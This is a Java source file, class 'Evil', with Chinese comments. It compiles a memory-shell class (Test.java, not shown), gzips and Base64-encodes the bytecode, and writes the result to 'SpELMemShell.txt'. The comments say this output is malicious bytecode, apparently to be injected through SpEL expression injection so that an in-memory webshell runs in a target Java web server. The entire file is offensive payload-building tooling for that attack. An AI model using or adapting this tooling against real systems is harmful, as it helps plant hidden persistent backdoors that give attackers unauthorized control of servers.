package com.test;

import java.io.*;
import java.util.Base64;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPOutputStream;

public class Evil {

    public static void main(String[] args) {
        // 内存马代码文件
        String javaFilePath = "Test.java";
        String classFilePath = getClassNameFromJavaPath(javaFilePath) + ".class";
        // 输出'gzip + Base64'的恶意字节码到文件
        String outputFilePath = "SpELMemShell.txt";

        try {
            // 编译 .java 文件
            compileJavaFile(javaFilePath);

            // 检查 .class 文件是否已生成
            if (!new File(classFilePath).exists()) {
                throw new FileNotFoundException("The compiled class file was not generated.");
            }

            // 压缩并编码 .class 文件
            String base64String = compressAndEncodeClassFile(classFilePath);

            // 写入文件
            writeToFile(outputFilePath, base64String);
        } catch (IOException e) {
            System.err.println("Error processing the file: " + e.getMessage());
        }
    }

    private static void compileJavaFile(String javaFilePath) throws IOException {
        // 内存马中的Object.class.getModule()方法是在Java 9及更高版本中引入的，因此需要指定使用Java 9+的javac进行编译
        String javacPath = "D:\\sec_software\\jdks\\jdk-17.0.6\\bin\\javac.exe";

        List<String> command = new ArrayList<>();
        command.add(javacPath); // 使用 javac 的完整路径
        command.add("-g:none");
        command.add("-Xlint:unchecked");
        command.add("-Xlint:deprecation");
        command.add(javaFilePath);

        ProcessBuilder processBuilder = new ProcessBuilder(command);
        Process process = processBuilder.start();

        // 等待编译完成
        try {
            int exitCode = process.waitFor();
            if (exitCode != 0) {
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                String line;
                while ((line = errorReader.readLine()) != null) {
                    System.err.println(line);
                }
                throw new RuntimeException("Compilation failed with exit code " + exitCode);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException("Compilation interrupted", e);
        }
    }

    private static String compressAndEncodeClassFile(String classFilePath) throws IOException {
        byte[] classData = readFile(classFilePath);

        // 使用 gzip 进行压缩
        byte[] compressedData = compress(classData);

        // 将压缩后的数据转换为 Base64 编码
        String encodedCompressedData = Base64.getEncoder().encodeToString(compressedData);

        // 输出原始长度和新的 Base64 编码长度
        System.out.println("Original Base64 encoded string length: " + classData.length);
        System.out.println("New Base64 encoded string length after gzip compression: " + encodedCompressedData.length());

        return encodedCompressedData;
    }

    private static byte[] readFile(String filePath) throws IOException {
        try (FileInputStream fis = new FileInputStream(filePath)) {
            byte[] data = new byte[fis.available()];
            fis.read(data);
            return data;
        }
    }

    private static byte[] compress(byte[] data) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (GZIPOutputStream gzos = new GZIPOutputStream(baos)) {
            gzos.write(data);
        }
        return baos.toByteArray();
    }

    private static void writeToFile(String filePath, String content) throws IOException {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath))) {
            writer.write(content);
        }
    }

    private static String getClassNameFromJavaPath(String javaFilePath) {
        String fileName = new File(javaFilePath).getName();
        return fileName.substring(0, fileName.indexOf('.'));
    }
}
